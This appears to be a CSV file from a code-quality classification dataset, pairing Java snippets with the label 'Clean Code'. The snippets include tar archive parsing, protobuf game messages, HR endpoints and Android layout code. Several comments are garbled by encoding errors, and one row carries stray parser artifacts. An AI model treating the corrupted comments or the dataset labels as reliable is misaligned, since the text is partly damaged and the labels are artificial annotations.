text,label,text_label
"/** 
 * Build the input streams consisting of all-zero input streams and non-zero input streams. When reading from the non-zero input streams, the data is actually read from the original input stream. The size of each input stream is introduced by the sparse headers. NOTE : Some all-zero input streams and non-zero input streams have the size of 0. We DO NOT store the 0 size input streams because they are meaningless.
 */
private void buildSparseInputStreams() throws IOException {
  currentSparseInputStreamIndex=-1;
  sparseInputStreams=new ArrayList<>();
  final List<TarArchiveStructSparse> sparseHeaders=currEntry.getSparseHeaders();
  if (sparseHeaders != null && sparseHeaders.size() > 1) {
    final Comparator<TarArchiveStructSparse> sparseHeaderComparator=(p,q) -> {
      final Long pOffset=p.getOffset();
      final Long qOffset=q.getOffset();
      return pOffset.compareTo(qOffset);
    }
;
    Collections.sort(sparseHeaders,sparseHeaderComparator);
  }
  if (sparseHeaders != null) {
    final InputStream zeroInputStream=new TarArchiveSparseZeroInputStream();
    long offset=0;
    for (    final TarArchiveStructSparse sparseHeader : sparseHeaders) {
      if (sparseHeader.getOffset() == 0 && sparseHeader.getNumbytes() == 0) {
        break;
      }
      if ((sparseHeader.getOffset() - offset) < 0) {
        throw new IOException(""Corrupted struct sparse detected"");
      }
      if ((sparseHeader.getOffset() - offset) > 0) {
        sparseInputStreams.add(new BoundedInputStream(zeroInputStream,sparseHeader.getOffset() - offset));
      }
      if (sparseHeader.getNumbytes() > 0) {
        sparseInputStreams.add(new BoundedInputStream(inputStream,sparseHeader.getNumbytes()));
      }
      offset=sparseHeader.getOffset() + sparseHeader.getNumbytes();
    }
  }
  if (!sparseInputStreams.isEmpty()) {
    currentSparseInputStreamIndex=0;
  }
}",0,Clean Code
"@TruffleBoundary public final boolean startsWith(VmCollection other){
  if (getLength() < other.getLength())   return false;
  var iter=iterator();
  var otherIter=other.iterator();
  while (otherIter.hasNext()) {
    if (!iter.next().equals(otherIter.next()))     return false;
  }
  return true;
}
",0,Clean Code
"Role getRole();
",0,Clean Code
"public GroupNotifyUser getUser1(){
  return this.user1;
}",0,Clean Code
"/** 
 * Update data source connection
 * @param param
 * @return
 */
DataResult<Long> updateWithPermission(DataSourceUpdateParam param);
",0,Clean Code
"/** 
 * 灏嗗璞¤浆鎹负 {@linkplain Category}鍒楄〃銆� <p> 鏀寔鏍煎紡濡備笅锛� </p> <p> <code>""...""</code> </p> <p> <code>{ ... }</code> </p> <p> <code>[ { ... }, ..., ""..."", ... ]</code> </p>
 * @param obj
 * @return
 */
protected List<Category> convertToCategories(Object obj){
  List<Category> categories=new ArrayList<Category>(1);
  convertToCategories(categories,obj);
  return categories;
}
protected void convertToCategories(List<Category> categories,Object obj){
  if (obj == null)   return;
 else   if (obj instanceof Category)   categories.add((Category)obj);
 else   if (obj instanceof String) {
    Category category=createCategory();
    category.setName((String)obj);
    categories.add(category);
  }
 else   if (obj instanceof Map<?,?>) {
    @SuppressWarnings(""unchecked"") Map<String,?> map=(Map<String,?>)obj;
    String name=(String)map.get(Category.PROPERTY_NAME);
    if (name == null)     return;
    Category category=createCategory();
    category.setName(name);
    category.setNameLabel(convertToLabel(map.get(Category.PROPERTY_NAME_LABEL)));
    category.setDescLabel(convertToLabel(map.get(Category.PROPERTY_DESC_LABEL)));
    category.setOrder(convertToInt(map.get(Category.PROPERTY_ORDER),category.getOrder()));
    categories.add(category);
  }
 else   if (obj instanceof Collection<?>) {
    Collection<?> collection=(Collection<?>)obj;
    for (    Object ele : collection)     convertToCategories(categories,ele);
  }
 else   if (obj instanceof Object[]) {
    Object[] array=(Object[])obj;
    for (    Object ele : array)     convertToCategories(categories,ele);
  }
 else   throw new UnsupportedOperationException(""Convert object of type ["" + obj.getClass().getName() + ""] to [""+ Category.class.getName()+ ""] is not supported"");
}",0,Clean Code
"/** 
 * <code>optional double defence = 3;</code>
 * @return this
 */
public AvatarProperty clearDefence(){
  bitField0_&=~0x00000004;
  defence=0D;
  return this;
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(dMJLJNDFOGP);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(kHBDIKDDIIB);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=(1 * rogueMiracleList.length()) + ProtoSink.computeRepeatedMessageSizeNoTag(rogueMiracleList);
  }
  return size;
}",0,Clean Code
"private static String parseAccessDesc(int access){
  if (access == 0) {
    return """";
  }
  StringBuilder r=new StringBuilder();
  if (TypeUtil.isPublic(access)) {
    r.append(""public "");
  }
 else   if (TypeUtil.isProtected(access)) {
    r.append(""protected "");
  }
 else   if (TypeUtil.isPrivate(access)) {
    r.append(""private "");
  }
  if (TypeUtil.isStatic(access)) {
    r.append(""static "");
  }
  if (TypeUtil.isFinal(access)) {
    r.append(""final "");
  }
  if (TypeUtil.isNative(access)) {
    r.append(""native "");
  }
  return r.toString();
}",0,Clean Code
"public String getWinRate(){
  return this.winRate;
}
",0,Clean Code
"@Override public String toString(){
  return ""Embedding {"" + "" vector = "" + Arrays.toString(vector) + "" }"";
}
",0,Clean Code
"/** 
 * 瑙ｆ瀽琛ㄨ揪寮忓弬鏁�
 * @param expression
 * @return
 */
public static Set<String> parseArgs(String expression,String regex){
  Set<String> args=new HashSet<>();
  if (StrUtil.isNotEmpty(expression)) {
    Pattern pattern=Pattern.compile(regex);
    Matcher matcher=pattern.matcher(expression);
    while (matcher.find()) {
      args.add(matcher.group(0));
    }
  }
  return args;
}",0,Clean Code
"@Override public String toString(){
  return toHexString();
}
",0,Clean Code
"int getSlideOutDistance(){
  int distance;
  if (mOrientation == VERTICAL) {
    distance=-getHeight();
    if (getChildCount() > 0) {
      int top=getChildAt(0).getTop();
      if (top < 0) {
        distance=distance + top;
      }
    }
  }
 else {
    if ((mFlag & PF_REVERSE_FLOW_PRIMARY) != 0) {
      distance=getWidth();
      if (getChildCount() > 0) {
        int start=getChildAt(0).getRight();
        if (start > distance) {
          distance=start;
        }
      }
    }
 else {
      distance=-getWidth();
      if (getChildCount() > 0) {
        int start=getChildAt(0).getLeft();
        if (start < 0) {
          distance=distance + start;
        }
      }
    }
  }
  return distance;
}",0,Clean Code
"@Override public LlamaChatResponse chatCompletion(LlamaChatRequest request){
  return this.internalInvocation(request,LlamaChatResponse.class);
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code GetGachaCeilingCsReq}
 */
public static GetGachaCeilingCsReq newInstance(){
  return new GetGachaCeilingCsReq();
}
",0,Clean Code
"public Builder withStream(boolean stream){
  this.stream=stream;
  return this;
}
",0,Clean Code
"@Override public ChallengeInfo clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  storyInfo.clearQuick();
  return this;
}",0,Clean Code
"/** 
 * 鑾峰彇妯″潡鐨勯樁娈典换鍔�
 * @param moduleId
 * @param version
 * @return
 */
List<StageTask> getByModuleIdAndVersion(Long moduleId,Integer version);
",0,Clean Code
"@PostMapping(""/addEmployee"") @ApiOperation(""鏂板缓鍛樺伐"") @OperateLog(apply=ApplyEnum.HRM,object=OperateObjectEnum.HRM_EMPLOYEE,behavior=BehaviorEnum.SAVE) public Result addEmployee(@Valid @RequestBody AddEmployeeBO employeeVO){
  List<OperationLog> operationLogList=employeeService.add(employeeVO);
  return OperationResult.ok(operationLogList);
}
@PostMapping(""/addEmployeeField"") @ApiOperation(""鏂板缓鑷畾涔夊瓧娈靛憳宸�"") @OperateLog(apply=ApplyEnum.HRM,object=OperateObjectEnum.HRM_EMPLOYEE,behavior=BehaviorEnum.SAVE) public Result addEmployee(@RequestBody AddEmployeeFieldManageBO addEmployeeFieldManageBO){
  List<OperationLog> operationLogList=employeeService.addEmployeeField(addEmployeeFieldManageBO);
  return OperationResult.ok(operationLogList);
}
",0,Clean Code
"public String getJoinGuildSig(){
  return this.mInfo.getJoinGuildSig();
}
",0,Clean Code
"/** 
 * <code>optional bool ACEOIOACIJO = 11;</code>
 * @return the aCEOIOACIJO
 */
public boolean getACEOIOACIJO(){
  return aCEOIOACIJO;
}",0,Clean Code
"/** 
 * Changes the player's current active avatar
 * @param slot The slot of the avatar we are changing to
 * @return true on success
 */
public boolean changeLeader(int slot){
  PlayerLineup lineup=this.getCurrentLineup();
  if (slot >= 0 && slot < lineup.size()) {
    lineup.setLeader(slot);
    return true;
  }
  return false;
}",0,Clean Code
"public RawCall getMatchedCall(){
  return matchedPartnerCall;
}
",0,Clean Code
"public void write(MemoryBuffer buffer,OffsetDateTime obj){
  LocalDateSerializer.writeLocalDate(buffer,obj.toLocalDate());
  LocalTimeSerializer.writeLocalTime(buffer,obj.toLocalTime());
  ZoneOffsetSerializer.writeZoneOffset(buffer,obj.getOffset());
}
",0,Clean Code
"public static int getPollutedPosition(TabbyVariable var){
  if (var != null) {
    String related=null;
    if (var.isPolluted()) {
      related=var.getValue().getRelatedType();
      if (related == null) {
        for (        TabbyVariable element : var.getElements().values()) {
          if (element != null && element.isPolluted()) {
            related=element.getValue().getRelatedType();
            break;
          }
        }
      }
      if (related == null) {
        for (        TabbyVariable field : var.getFieldMap().values()) {
          if (field != null && field.isPolluted()) {
            related=field.getValue().getRelatedType();
            break;
          }
        }
      }
    }
 else     if (var.containsPollutedVar(new ArrayList<>())) {
      related=var.getFirstPollutedVarRelatedType();
    }
    if (related != null) {
      return PositionUtils.getPosition(related);
    }
  }
  return PositionUtils.NOT_POLLUTED_POSITION;
}
",0,Clean Code
"void onWindowSizeChanged(int size);
private void onWindowSizeChanged(){
  int size=sizeNotifierLayout.getHeight();
  if (!keyboardVisible) {
    size-=emojiPadding;
  }
  if (delegate != null) {
    delegate.onWindowSizeChanged(size);
  }
  if (topView != null) {
    if (size < AndroidUtilities.dp(72) + ActionBar.getCurrentActionBarHeight()) {
      if (allowShowTopView) {
        allowShowTopView=false;
        if (needShowTopView) {
          topView.setVisibility(GONE);
          topLineView.setVisibility(GONE);
          topLineView.setAlpha(0.0f);
          resizeForTopView(false);
          topViewEnterProgress=0f;
          topView.setTranslationY(topView.getLayoutParams().height);
        }
      }
    }
 else {
      if (!allowShowTopView) {
        allowShowTopView=true;
        if (needShowTopView) {
          topView.setVisibility(VISIBLE);
          topLineView.setVisibility(VISIBLE);
          topLineView.setAlpha(1.0f);
          resizeForTopView(true);
          topViewEnterProgress=1f;
          topView.setTranslationY(0);
        }
      }
    }
  }
}",0,Clean Code
"/** 
 * <code>optional uint32 buff_id = 12;</code>
 * @return the buffId
 */
public int getBuffId(){
  return buffId;
}",0,Clean Code
"@PostMapping(""/delete/{attendanceGroupId}"") @ApiOperation(""鍒犻櫎鑰冨嫟缁�"") @OperateLog(apply=ApplyEnum.HUMAN_RESOURCE_MANAGEMENT,type=OperateTypeEnum.SETTING,behavior=BehaviorEnum.DELETE,object=OperateObjectEnum.HUMAN_ATTENDANCE_RULE_SETTING) public Result deleteAttendanceGroup(@PathVariable(""attendanceGroupId"") Long attendanceGroupId){
  OperationLog operationLog=attendanceGroupService.deleteAttendanceGroup(attendanceGroupId);
  return OperationResult.ok(operationLog);
}
",0,Clean Code
"@Test public void stringResultShouldBeCorrectlyExtracted(){
  final JsonJqTransform jsonJqTransform=new JsonJqTransform(objectMapper);
  final WorkflowModel workflow=new WorkflowModel();
  final TaskModel task=new TaskModel();
  final Map<String,Object> taskInput=new HashMap<>();
  taskInput.put(""data"",new ArrayList<>());
  taskInput.put(""queryExpression"",""if(.data | length >0) then \""EXISTS\"" else \""CREATE\"" end"");
  task.setInputData(taskInput);
  jsonJqTransform.start(workflow,task,null);
  assertNull(task.getOutputData().get(""error""));
  assertTrue(task.getOutputData().get(""result"") instanceof String);
  String result=(String)task.getOutputData().get(""result"");
  assertEquals(""CREATE"",result);
}",0,Clean Code
"/** 
 * <code>optional uint32 roll_shop_id = 15;</code>
 * @return the rollShopId
 */
public int getRollShopId(){
  return rollShopId;
}",0,Clean Code
"/** 
 * <code>repeated .RelicAffix sub_affix_list = 4;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableSubAffixList()} if you want to modify it.
 * @return internal storage object for reading
 */
public RepeatedMessage<RelicAffixOuterClass.RelicAffix> getSubAffixList(){
  return subAffixList;
}",0,Clean Code
"/** 
 * <code>optional uint32 prop_id = 4;</code>
 * @return the propId
 */
public int getPropId(){
  return propId;
}",0,Clean Code
"@Override public int getId(){
  return (GroupID << 16) + StarCount;
}",0,Clean Code
"/** 
 * <code>repeated .Shop shop_list = 8;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedMessage<ShopOuterClass.Shop> getMutableShopList(){
  bitField0_|=0x00000004;
  return shopList;
}",0,Clean Code
"@Override public String getSessionId(){
  return null;
}
",0,Clean Code
"@Test public void testZrevrangeByLex(){
  jedisCluster.zrevrangeByLex(""key"",""max"",""min"");
  jedisCluster.zrevrangeByLex(""key"",""max"",""min"",1337,1338);
}",0,Clean Code
"@Override public RelicArchive mergeFrom(final RelicArchive other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasRelicId()) {
    setRelicId(other.relicId);
  }
  if (other.hasSlot()) {
    setSlot(other.slot);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@762201ef!org.eclipse.jdt.core.dom.MethodDeclaration@152fd45",0,Clean Code
"public Integer getDimensions(){
  return this.dimensions;
}
",0,Clean Code
"@PostMapping(""/adminAddEmployee"") @ApiOperation(""浠庣郴缁熺敤鎴锋坊鍔犲憳宸�"") @OperateLog(apply=ApplyEnum.HRM,object=OperateObjectEnum.HRM_EMPLOYEE,behavior=BehaviorEnum.SAVE) public Result adminAddEmployee(@RequestBody List<AddEmployeeBO> employeeList){
  List<OperationLog> operationLogs=employeeService.adminAddEmployee(employeeList);
  return OperationResult.ok(operationLogs);
}
",0,Clean Code
"/** 
 * <code>repeated uint32 text_join_id_list = 3;</code>
 * @param value the textJoinIdList to add
 * @return this
 */
public TextJoinQueryCsReq addTextJoinIdList(final int value){
  bitField0_|=0x00000001;
  textJoinIdList.add(value);
  return this;
}",0,Clean Code
"public int getSizeOfUnmatchedFunctions(final ESide side){
  return metadata.getSizeOfUnmatchedFunctions(side);
}
",0,Clean Code
"@Override public List<HrmEmployee> queryBecomeEmpListByTime(LocalDate time,Collection<Long> employeeIds){
  return employeeMapper.queryBecomeEmpListByTime(time,employeeIds);
}
",0,Clean Code
"MockLVQPackedVectors(LocallyAdaptiveVectorQuantization lvq,List<VectorFloat<?>> vectors,Path testDirectory) throws IOException {
  var ravv=new ListRandomAccessVectorValues(vectors,lvq.globalMean.length());
  var encodedVectors=lvq.encodeAll(ravv);
  var lvqPath=testDirectory.resolve(""lvq"" + System.nanoTime());
  try (var out=TestUtil.openDataOutputStream(lvqPath)){
    for (    var encodedVector : encodedVectors) {
      encodedVector.writePacked(out);
    }
  }
   var dimension=lvq.globalMean.length();
  this.reader=new SimpleMappedReader(lvqPath);
  this.encodedVectorSize=2 * Float.BYTES + ((dimension % 64 == 0) ? dimension : ((dimension / 64 + 1) * 64));
  this.packedVector=vectorTypeSupport.createByteSequence(encodedVectorSize - 2 * Float.BYTES);
}",0,Clean Code
